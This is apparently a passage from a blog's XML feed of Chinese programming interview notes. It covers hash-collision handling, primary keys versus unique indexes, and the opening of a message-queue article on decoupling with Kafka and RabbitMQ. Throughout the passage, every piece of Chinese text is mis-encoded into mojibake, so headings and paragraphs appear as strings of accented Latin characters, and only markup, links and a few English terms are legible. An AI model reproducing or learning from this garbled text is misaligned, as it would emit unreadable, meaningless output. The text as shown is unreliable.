id="è§£å†³å“ˆå¸Œç¢°æ’çš„æ–¹æ³•">è§£å†³å“ˆå¸Œç¢°æ’çš„æ–¹æ³•</span></h2><ol><li><p>å¼€æ”¾å®šå€æ³•<br>æ‰€è°“çš„å¼€æ”¾å®šå€æ³•å°±æ˜¯ä¸€æ—¦å‘ç”Ÿäº†å†²çªï¼Œå°±å»å¯»æ‰¾ä¸‹ä¸€ä¸ªç©ºçš„æ•£åˆ—åœ°å€ï¼Œåªè¦æ•£åˆ—è¡¨è¶³å¤Ÿå¤§ï¼Œç©ºçš„æ•£åˆ—åœ°å€æ€»èƒ½æ‰¾åˆ°ï¼Œå¹¶å°†è®°å½•å­˜å…¥ </p></li><li><p>å†å“ˆå¸Œæ³•</p><p>æœ‰å¤šä¸ªä¸åŒçš„Hashå‡½æ•°ï¼Œå½“å‘ç”Ÿå†²çªæ—¶ï¼Œä½¿ç”¨ç¬¬äºŒä¸ªï¼Œç¬¬ä¸‰ä¸ªï¼Œâ€¦.ï¼Œç­‰å“ˆå¸Œå‡½æ•°<br>è®¡ç®—åœ°å€ï¼Œç›´åˆ°æ— å†²çªã€‚è™½ç„¶ä¸æ˜“å‘ç”Ÿèšé›†ï¼Œä½†æ˜¯å¢åŠ äº†è®¡ç®—æ—¶é—´ã€‚</p></li><li><p>æ‹‰é“¾æ³•</p><p>æ¯ä¸ªå“ˆå¸Œè¡¨èŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªnextæŒ‡é’ˆï¼Œå¤šä¸ªå“ˆå¸Œè¡¨èŠ‚ç‚¹å¯ä»¥ç”¨nextæŒ‡é’ˆæ„æˆä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œè¢«åˆ†é…åˆ°åŒä¸€ä¸ªç´¢å¼•ä¸Šçš„å¤šä¸ªèŠ‚ç‚¹å¯ä»¥ç”¨è¿™ä¸ªå•å‘<br>é“¾è¡¨è¿æ¥èµ·æ¥</p></li></ol><h1><span id="æ•°æ®åº“">æ•°æ®åº“</span></h1><h2><span id="ä¸»é”®å’Œå”¯ä¸€ç´¢å¼•çš„åŒºåˆ«ä»¥åŠç´¢å¼•çš„ä¼˜ç¼ºç‚¹">ä¸»é”®å’Œå”¯ä¸€ç´¢å¼•çš„åŒºåˆ«ä»¥åŠç´¢å¼•çš„ä¼˜ç¼ºç‚¹</span></h2><p>ä¸€ ä¸»é”®å’Œå”¯ä¸€ç´¢å¼•éƒ½è¦æ±‚å€¼å”¯ä¸€ï¼Œä½†æ˜¯å®ƒä»¬è¿˜æ˜¯æœ‰åŒºåˆ«çš„ï¼š</p><p>1.ä¸»é”®æ˜¯ä¸€ç§çº¦æŸï¼Œå”¯ä¸€ç´¢å¼•æ˜¯ä¸€ç§ç´¢å¼•ï¼›<br>2.ä¸€å¼ è¡¨åªèƒ½æœ‰ä¸€ä¸ªä¸»é”®ï¼Œä½†å¯ä»¥åˆ›å»ºå¤šä¸ªå”¯ä¸€ç´¢å¼•ï¼›<br>3.ä¸»é”®åˆ›å»ºåä¸€å®šåŒ…å«ä¸€ä¸ªå”¯ä¸€ç´¢å¼•ï¼Œå”¯ä¸€ç´¢å¼•å¹¶ä¸€å®šæ˜¯ä¸»é”®ï¼›<br>4.ä¸»é”®ä¸èƒ½ä¸ºnullï¼Œå”¯ä¸€ç´¢å¼•å¯ä»¥ä¸ºnullï¼›<br>5.ä¸»é”®å¯ä»¥åšä¸ºå¤–é”®ï¼Œå”¯ä¸€ç´¢å¼•ä¸è¡Œï¼›<br>6.ä¸»é”®äº§ç”Ÿå”¯ä¸€çš„èšé›†ç´¢å¼•ï¼Œå”¯ä¸€ç´¢å¼•äº§ç”Ÿå”¯ä¸€çš„éèšé›†ç´¢å¼•</p><p>æ³¨ï¼šèšç°‡ç´¢å¼•ç¡®å®šè¡¨ä¸­æ•°æ®çš„ç‰©ç†é¡ºåºï¼Œæ‰€ä»¥æ˜¯ä¸»é”®æ˜¯å”¯ä¸€çš„</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é˜¿é‡Œé¢è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¶ˆæ¯é˜Ÿåˆ—</title>
      <link href="/2020/04/07/mq/"/>
      <url>/2020/04/07/mq/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†å¸¸è€ƒçš„æ¶ˆæ¯é˜Ÿåˆ—çŸ¥è¯†ç‚¹ã€‚</p><span id="more"></span><!-- toc --><ul><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%82%B9%E5%92%8C%E7%BC%BA%E7%82%B9kafka-activemq-rabbitmq-rocketmq-%E9%83%BD%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%E4%BB%A5%E5%8F%8A%E9%80%82%E5%90%88%E5%93%AA%E4%BA%9B%E5%9C%BA%E6%99%AF">ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼Ÿæ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç‚¹å’Œç¼ºç‚¹ï¼ŸKafkaã€ActiveMQã€RabbitMQã€RocketMQ éƒ½æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä»¥åŠé€‚åˆå“ªäº›åœºæ™¯ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97">ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—</a><ul><li><a href="#%E8%A7%A3%E8%80%A6">è§£è€¦</a></li><li><a href="#%E5%BC%82%E6%AD%A5">å¼‚æ­¥</a></li><li><a href="#%E5%89%8A%E5%B3%B0">å‰Šå³°</a></li></ul></li><li><a href="#%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%BC%BA%E7%82%B9">æ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹</a></li><li><a href="#kafka-activemq-rabbitmq-rocketmq-%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%BC%BA%E7%82%B9">Kafkaã€ActiveMQã€RabbitMQã€RocketMQ æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ</a></li></ul></li></ul></li><li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E7%9A%84%E9%AB%98%E5%8F%AF%E7%94%A8">å¦‚ä½•ä¿è¯æ¶ˆæ¯é˜Ÿåˆ—çš„é«˜å¯ç”¨ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-1">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-1">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#rabbitmq-%E7%9A%84%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7">RabbitMQ çš„é«˜å¯ç”¨æ€§</a><ul><li><a href="#%E5%8D%95%E6%9C%BA%E6%A8%A1%E5%BC%8F">å•æœºæ¨¡å¼</a></li><li><a href="#%E6%99%AE%E9%80%9A%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F%E6%97%A0%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7">æ™®é€šé›†ç¾¤æ¨¡å¼ï¼ˆæ— é«˜å¯ç”¨æ€§ï¼‰</a></li><li><a href="#%E9%95%9C%E5%83%8F%E9%9B%86%E7%BE%A4%E6%A8%A1%E5%BC%8F%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7">é•œåƒé›†ç¾¤æ¨¡å¼ï¼ˆé«˜å¯ç”¨æ€§ï¼‰</a></li></ul></li><li><a href="#kafka-%E7%9A%84%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7">Kafka çš„é«˜å¯ç”¨æ€§</a></li></ul></li></ul></li><li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E4%B8%8D%E8%A2%AB%E9%87%8D%E5%A4%8D%E6%B6%88%E8%B4%B9%E6%88%96%E8%80%85%E8%AF%B4%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E6%B6%88%E8%B4%B9%E7%9A%84%E5%B9%82%E7%AD%89%E6%80%A7">å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸è¢«é‡å¤æ¶ˆè´¹ï¼Ÿæˆ–è€…è¯´ï¼Œå¦‚ä½•ä¿è¯æ¶ˆæ¯æ¶ˆè´¹çš„å¹‚ç­‰æ€§ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-2">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-2">é¢è¯•é¢˜å‰–æ</a></li></ul></li><li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E7%9A%84%E5%8F%AF%E9%9D%A0%E6%80%A7%E4%BC%A0%E8%BE%93%E6%88%96%E8%80%85%E8%AF%B4%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E6%B6%88%E6%81%AF%E4%B8%A2%E5%A4%B1%E7%9A%84%E9%97%AE%E9%A2%98">å¦‚ä½•ä¿è¯æ¶ˆæ¯çš„å¯é æ€§ä¼ è¾“ï¼Ÿæˆ–è€…è¯´ï¼Œå¦‚ä½•å¤„ç†æ¶ˆæ¯ä¸¢å¤±çš„é—®é¢˜ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-3">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-3">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#rabbitmq">RabbitMQ</a><ul><li><a href="#%E7%94%9F%E4%BA%A7%E8%80%85%E5%BC%84%E4%B8%A2%E4%BA%86%E6%95%B0%E6%8D%AE">ç”Ÿäº§è€…å¼„ä¸¢äº†æ•°æ®</a></li><li><a href="#rabbitmq-%E5%BC%84%E4%B8%A2%E4%BA%86%E6%95%B0%E6%8D%AE">RabbitMQ å¼„ä¸¢äº†æ•°æ®</a></li><li><a href="#%E6%B6%88%E8%B4%B9%E7%AB%AF%E5%BC%84%E4%B8%A2%E4%BA%86%E6%95%B0%E6%8D%AE">æ¶ˆè´¹ç«¯å¼„ä¸¢äº†æ•°æ®</a></li></ul></li><li><a href="#kafka">Kafka</a><ul><li><a href="#%E6%B6%88%E8%B4%B9%E7%AB%AF%E5%BC%84%E4%B8%A2%E4%BA%86%E6%95%B0%E6%8D%AE-1">æ¶ˆè´¹ç«¯å¼„ä¸¢äº†æ•°æ®</a></li><li><a href="#kafka-%E5%BC%84%E4%B8%A2%E4%BA%86%E6%95%B0%E6%8D%AE">Kafka å¼„ä¸¢äº†æ•°æ®</a></li><li><a href="#%E7%94%9F%E4%BA%A7%E8%80%85%E4%BC%9A%E4%B8%8D%E4%BC%9A%E5%BC%84%E4%B8%A2%E6%95%B0%E6%8D%AE">ç”Ÿäº§è€…ä¼šä¸ä¼šå¼„ä¸¢æ•°æ®ï¼Ÿ</a></li></ul></li></ul></li></ul></li><li><a href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E7%9A%84%E9%A1%BA%E5%BA%8F%E6%80%A7">å¦‚ä½•ä¿è¯æ¶ˆæ¯çš„é¡ºåºæ€§ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-4">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-4">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">è§£å†³æ–¹æ¡ˆ</a><ul><li><a href="#rabbitmq-1">RabbitMQ</a></li><li><a href="#kafka-1">Kafka</a></li></ul></li></ul></li></ul></li><li><a href="#%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E7%9A%84%E5%BB%B6%E6%97%B6%E4%BB%A5%E5%8F%8A%E8%BF%87%E6%9C%9F%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E6%BB%A1%E4%BA%86%E4%BB%A5%E5%90%8E%E8%AF%A5%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86%E6%9C%89%E5%87%A0%E7%99%BE%E4%B8%87%E6%B6%88%E6%81%AF%E6%8C%81%E7%BB%AD%E7%A7%AF%E5%8E%8B%E5%87%A0%E5%B0%8F%E6%97%B6%E8%AF%B4%E8%AF%B4%E6%80%8E%E4%B9%88%E8%A7%A3%E5%86%B3">å¦‚ä½•è§£å†³æ¶ˆæ¯é˜Ÿåˆ—çš„å»¶æ—¶ä»¥åŠè¿‡æœŸå¤±æ•ˆé—®é¢˜ï¼Ÿæ¶ˆæ¯é˜Ÿåˆ—æ»¡äº†ä»¥åè¯¥æ€ä¹ˆå¤„ç†ï¼Ÿæœ‰å‡ ç™¾ä¸‡æ¶ˆæ¯æŒç»­ç§¯å‹å‡ å°æ—¶ï¼Œè¯´è¯´æ€ä¹ˆè§£å†³ï¼Ÿ</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-5">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-5">é¢è¯•é¢˜å‰–æ</a><ul><li><a href="#%E5%A4%A7%E9%87%8F%E6%B6%88%E6%81%AF%E5%9C%A8-mq-%E9%87%8C%E7%A7%AF%E5%8E%8B%E4%BA%86%E5%87%A0%E4%B8%AA%E5%B0%8F%E6%97%B6%E4%BA%86%E8%BF%98%E6%B2%A1%E8%A7%A3%E5%86%B3">å¤§é‡æ¶ˆæ¯åœ¨ mq é‡Œç§¯å‹äº†å‡ ä¸ªå°æ—¶äº†è¿˜æ²¡è§£å†³</a></li><li><a href="#mq-%E4%B8%AD%E7%9A%84%E6%B6%88%E6%81%AF%E8%BF%87%E6%9C%9F%E5%A4%B1%E6%95%88%E4%BA%86">mq ä¸­çš„æ¶ˆæ¯è¿‡æœŸå¤±æ•ˆäº†</a></li><li><a href="#mq-%E9%83%BD%E5%BF%AB%E5%86%99%E6%BB%A1%E4%BA%86">mq éƒ½å¿«å†™æ»¡äº†</a></li></ul></li></ul></li><li><a href="#%E5%A6%82%E6%9E%9C%E8%AE%A9%E4%BD%A0%E5%86%99%E4%B8%80%E4%B8%AA%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E8%AF%A5%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E8%AF%B4%E4%B8%80%E4%B8%8B%E4%BD%A0%E7%9A%84%E6%80%9D%E8%B7%AF">å¦‚æœè®©ä½ å†™ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œè¯¥å¦‚ä½•è¿›è¡Œæ¶æ„è®¾è®¡ï¼Ÿè¯´ä¸€ä¸‹ä½ çš„æ€è·¯ã€‚</a><ul><li><a href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E5%BF%83%E7%90%86%E5%88%86%E6%9E%90-6">é¢è¯•å®˜å¿ƒç†åˆ†æ</a></li><li><a href="#%E9%9D%A2%E8%AF%95%E9%A2%98%E5%89%96%E6%9E%90-6">é¢è¯•é¢˜å‰–æ</a></li></ul></li></ul><!-- tocstop --><h1><span id="ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—æ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç‚¹å’Œç¼ºç‚¹kafka-activemq-rabbitmq-rocketmq-éƒ½æœ‰ä»€ä¹ˆåŒºåˆ«ä»¥åŠé€‚åˆå“ªäº›åœºæ™¯">ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼Ÿæ¶ˆæ¯é˜Ÿåˆ—æœ‰ä»€ä¹ˆä¼˜ç‚¹å’Œç¼ºç‚¹ï¼ŸKafkaã€ActiveMQã€RabbitMQã€RocketMQ éƒ½æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä»¥åŠé€‚åˆå“ªäº›åœºæ™¯ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>å…¶å®é¢è¯•å®˜ä¸»è¦æ˜¯æƒ³çœ‹çœ‹ï¼š</p><ul><li><p><strong>ç¬¬ä¸€</strong>ï¼Œä½ çŸ¥ä¸çŸ¥é“ä½ ä»¬ç³»ç»Ÿé‡Œä¸ºä»€ä¹ˆè¦ç”¨æ¶ˆæ¯é˜Ÿåˆ—è¿™ä¸ªä¸œè¥¿ï¼Ÿ<br><br>ä¸å°‘å€™é€‰äººï¼Œè¯´è‡ªå·±é¡¹ç›®é‡Œç”¨äº† Redisã€MQï¼Œä½†æ˜¯å…¶å®ä»–å¹¶ä¸çŸ¥é“è‡ªå·±ä¸ºä»€ä¹ˆè¦ç”¨è¿™ä¸ªä¸œè¥¿ã€‚å…¶å®è¯´ç™½äº†ï¼Œå°±æ˜¯ä¸ºäº†ç”¨è€Œç”¨ï¼Œæˆ–è€…æ˜¯åˆ«äººè®¾è®¡çš„æ¶æ„ï¼Œä»–ä»å¤´åˆ°å°¾éƒ½æ²¡æ€è€ƒè¿‡ã€‚<br><br>æ²¡æœ‰å¯¹è‡ªå·±çš„æ¶æ„é—®è¿‡ä¸ºä»€ä¹ˆçš„äººï¼Œä¸€å®šæ˜¯å¹³æ—¶æ²¡æœ‰æ€è€ƒçš„äººï¼Œé¢è¯•å®˜å¯¹è¿™ç±»å€™é€‰äººå°è±¡é€šå¸¸å¾ˆä¸å¥½ã€‚å› ä¸ºé¢è¯•å®˜æ‹…å¿ƒä½ è¿›äº†å›¢é˜Ÿä¹‹ååªä¼šæœ¨å¤´æœ¨è„‘çš„å¹²å‘†æ´»å„¿ï¼Œä¸ä¼šè‡ªå·±æ€è€ƒã€‚</p></li><li><p><strong>ç¬¬äºŒ</strong>ï¼Œä½ æ—¢ç„¶ç”¨äº†æ¶ˆæ¯é˜Ÿåˆ—è¿™ä¸ªä¸œè¥¿ï¼Œä½ çŸ¥ä¸çŸ¥é“ç”¨äº†æœ‰ä»€ä¹ˆå¥½å¤„&amp;åå¤„ï¼Ÿ<br><br>ä½ è¦æ˜¯æ²¡è€ƒè™‘è¿‡è¿™ä¸ªï¼Œé‚£ä½ ç›²ç›®å¼„ä¸ª MQ è¿›ç³»ç»Ÿé‡Œï¼Œåé¢å‡ºäº†é—®é¢˜ä½ æ˜¯ä¸æ˜¯å°±è‡ªå·±æºœäº†ç»™å…¬å¸ç•™å‘ï¼Ÿä½ è¦æ˜¯æ²¡è€ƒè™‘è¿‡å¼•å…¥ä¸€ä¸ªæŠ€æœ¯å¯èƒ½å­˜åœ¨çš„å¼Šç«¯å’Œé£é™©ï¼Œé¢è¯•å®˜æŠŠè¿™ç±»å€™é€‰äººæ‹›è¿›æ¥äº†ï¼ŒåŸºæœ¬å¯èƒ½å°±æ˜¯æŒ–å‘å‹é€‰æ‰‹ã€‚å°±æ€•ä½ å¹² 1 å¹´æŒ–ä¸€å †å‘ï¼Œè‡ªå·±è·³æ§½äº†ï¼Œç»™å…¬å¸ç•™ä¸‹æ— ç©·åæ‚£ã€‚</p></li><li><p><strong>ç¬¬ä¸‰</strong>ï¼Œæ—¢ç„¶ä½ ç”¨äº† MQï¼Œå¯èƒ½æ˜¯æŸä¸€ç§ MQï¼Œé‚£ä¹ˆä½ å½“æ—¶åšæ²¡åšè¿‡è°ƒç ”ï¼Ÿ<br><br>ä½ åˆ«å‚»ä¹ä¹çš„è‡ªå·±æ‹è„‘è¢‹çœ‹ä¸ªäººå–œå¥½å°±çç”¨äº†ä¸€ä¸ª MQï¼Œæ¯”å¦‚ Kafkaï¼Œç”šè‡³éƒ½ä»æ²¡è°ƒç ”è¿‡ä¸šç•Œæµè¡Œçš„ MQ åˆ°åº•æœ‰å“ªå‡ ç§ã€‚æ¯ä¸€ä¸ª MQ çš„ä¼˜ç‚¹å’Œç¼ºç‚¹æ˜¯ä»€ä¹ˆã€‚æ¯ä¸€ä¸ª MQ <strong>æ²¡æœ‰ç»å¯¹çš„å¥½å</strong>ï¼Œä½†æ˜¯å°±æ˜¯çœ‹ç”¨åœ¨å“ªä¸ªåœºæ™¯å¯ä»¥<strong>æ‰¬é•¿é¿çŸ­ï¼Œåˆ©ç”¨å…¶ä¼˜åŠ¿ï¼Œè§„é¿å…¶åŠ£åŠ¿</strong>ã€‚<br><br>å¦‚æœæ˜¯ä¸€ä¸ªä¸è€ƒè™‘æŠ€æœ¯é€‰å‹çš„å€™é€‰äººæ‹›è¿›äº†å›¢é˜Ÿï¼Œleader äº¤ç»™ä»–ä¸€ä¸ªä»»åŠ¡ï¼Œå»è®¾è®¡ä¸ªä»€ä¹ˆç³»ç»Ÿï¼Œä»–åœ¨é‡Œé¢ç”¨ä¸€äº›æŠ€æœ¯ï¼Œå¯èƒ½éƒ½æ²¡è€ƒè™‘è¿‡é€‰å‹ï¼Œæœ€åé€‰çš„æŠ€æœ¯å¯èƒ½å¹¶ä¸ä¸€å®šåˆé€‚ï¼Œä¸€æ ·æ˜¯ç•™å‘ã€‚</p></li></ul><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><h3><span id="ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—">ä¸ºä»€ä¹ˆä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—</span></h3><p>å…¶å®å°±æ˜¯é—®é—®ä½ æ¶ˆæ¯é˜Ÿåˆ—éƒ½æœ‰å“ªäº›ä½¿ç”¨åœºæ™¯ï¼Œç„¶åä½ é¡¹ç›®é‡Œå…·ä½“æ˜¯ä»€ä¹ˆåœºæ™¯ï¼Œè¯´è¯´ä½ åœ¨è¿™ä¸ªåœºæ™¯é‡Œç”¨æ¶ˆæ¯é˜Ÿåˆ—æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>é¢è¯•å®˜é—®ä½ è¿™ä¸ªé—®é¢˜ï¼Œ<strong>æœŸæœ›çš„ä¸€ä¸ªå›ç­”</strong>æ˜¯è¯´ï¼Œä½ ä»¬å…¬å¸æœ‰ä¸ªä»€ä¹ˆ<strong>ä¸šåŠ¡åœºæ™¯</strong>ï¼Œè¿™ä¸ªä¸šåŠ¡åœºæ™¯æœ‰ä¸ªä»€ä¹ˆæŠ€æœ¯æŒ‘æˆ˜ï¼Œå¦‚æœä¸ç”¨ MQ å¯èƒ½ä¼šå¾ˆéº»çƒ¦ï¼Œä½†æ˜¯ä½ ç°åœ¨ç”¨äº† MQ ä¹‹åå¸¦ç»™äº†ä½ å¾ˆå¤šçš„å¥½å¤„ã€‚</p><p>å…ˆè¯´ä¸€ä¸‹æ¶ˆæ¯é˜Ÿåˆ—å¸¸è§çš„ä½¿ç”¨åœºæ™¯å§ï¼Œå…¶å®åœºæ™¯æœ‰å¾ˆå¤šï¼Œä½†æ˜¯æ¯”è¾ƒæ ¸å¿ƒçš„æœ‰ 3 ä¸ªï¼š<strong>è§£è€¦</strong>ã€<strong>å¼‚æ­¥</strong>ã€<strong>å‰Šå³°</strong>ã€‚</p><h4><span id="è§£è€¦">è§£è€¦</span></h4><p>çœ‹è¿™ä¹ˆä¸ªåœºæ™¯ã€‚A ç³»ç»Ÿå‘é€æ•°æ®åˆ° BCD ä¸‰ä¸ªç³»ç»Ÿï¼Œé€šè¿‡æ¥å£è°ƒç”¨å‘é€ã€‚å¦‚æœ E ç³»ç»Ÿä¹Ÿè¦è¿™ä¸ªæ•°æ®å‘¢ï¼Ÿé‚£å¦‚æœ C ç³»ç»Ÿç°åœ¨ä¸éœ€è¦äº†å‘¢ï¼ŸA ç³»ç»Ÿè´Ÿè´£äººå‡ ä¹å´©æºƒâ€¦â€¦</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-1.png" alt="mq-1"></p><p>åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼ŒA ç³»ç»Ÿè·Ÿå…¶å®ƒå„ç§ä¹±ä¸ƒå…«ç³Ÿçš„ç³»ç»Ÿä¸¥é‡è€¦åˆï¼ŒA ç³»ç»Ÿäº§ç”Ÿä¸€æ¡æ¯”è¾ƒå…³é”®çš„æ•°æ®ï¼Œå¾ˆå¤šç³»ç»Ÿéƒ½éœ€è¦ A ç³»ç»Ÿå°†è¿™ä¸ªæ•°æ®å‘é€è¿‡æ¥ã€‚A ç³»ç»Ÿè¦æ—¶æ—¶åˆ»åˆ»è€ƒè™‘ BCDE å››ä¸ªç³»ç»Ÿå¦‚æœæŒ‚äº†è¯¥å’‹åŠï¼Ÿè¦ä¸è¦é‡å‘ï¼Œè¦ä¸è¦æŠŠæ¶ˆæ¯å­˜èµ·æ¥ï¼Ÿå¤´å‘éƒ½ç™½äº†å•Šï¼</p><p>å¦‚æœä½¿ç”¨ MQï¼ŒA ç³»ç»Ÿäº§ç”Ÿä¸€æ¡æ•°æ®ï¼Œå‘é€åˆ° MQ é‡Œé¢å»ï¼Œå“ªä¸ªç³»ç»Ÿéœ€è¦æ•°æ®è‡ªå·±å» MQ é‡Œé¢æ¶ˆè´¹ã€‚å¦‚æœæ–°ç³»ç»Ÿéœ€è¦æ•°æ®ï¼Œç›´æ¥ä» MQ é‡Œæ¶ˆè´¹å³å¯ï¼›å¦‚æœæŸä¸ªç³»ç»Ÿä¸éœ€è¦è¿™æ¡æ•°æ®äº†ï¼Œå°±å–æ¶ˆå¯¹ MQ æ¶ˆæ¯çš„æ¶ˆè´¹å³å¯ã€‚è¿™æ ·ä¸‹æ¥ï¼ŒA ç³»ç»Ÿå‹æ ¹å„¿ä¸éœ€è¦å»è€ƒè™‘è¦ç»™è°å‘é€æ•°æ®ï¼Œä¸éœ€è¦ç»´æŠ¤è¿™ä¸ªä»£ç ï¼Œä¹Ÿä¸éœ€è¦è€ƒè™‘äººå®¶æ˜¯å¦è°ƒç”¨æˆåŠŸã€å¤±è´¥è¶…æ—¶ç­‰æƒ…å†µã€‚</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-2.png" alt="mq-2"></p><p><strong>æ€»ç»“</strong>ï¼šé€šè¿‡ä¸€ä¸ª MQï¼ŒPub&#x2F;Sub å‘å¸ƒè®¢é˜…æ¶ˆæ¯è¿™ä¹ˆä¸€ä¸ªæ¨¡å‹ï¼ŒA ç³»ç»Ÿå°±è·Ÿå…¶å®ƒç³»ç»Ÿå½»åº•è§£è€¦äº†ã€‚</p><p><strong>é¢è¯•æŠ€å·§</strong>ï¼šä½ éœ€è¦å»è€ƒè™‘ä¸€ä¸‹ä½ è´Ÿè´£çš„ç³»ç»Ÿä¸­æ˜¯å¦æœ‰ç±»ä¼¼çš„åœºæ™¯ï¼Œå°±æ˜¯ä¸€ä¸ªç³»ç»Ÿæˆ–è€…ä¸€ä¸ªæ¨¡å—ï¼Œè°ƒç”¨äº†å¤šä¸ªç³»ç»Ÿæˆ–è€…æ¨¡å—ï¼Œäº’ç›¸ä¹‹é—´çš„è°ƒç”¨å¾ˆå¤æ‚ï¼Œç»´æŠ¤èµ·æ¥å¾ˆéº»çƒ¦ã€‚ä½†æ˜¯å…¶å®è¿™ä¸ªè°ƒç”¨æ˜¯ä¸éœ€è¦ç›´æ¥åŒæ­¥è°ƒç”¨æ¥å£çš„ï¼Œå¦‚æœç”¨ MQ ç»™å®ƒå¼‚æ­¥åŒ–è§£è€¦ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½ å°±éœ€è¦å»è€ƒè™‘åœ¨ä½ çš„é¡¹ç›®é‡Œï¼Œæ˜¯ä¸æ˜¯å¯ä»¥è¿ç”¨è¿™ä¸ª MQ 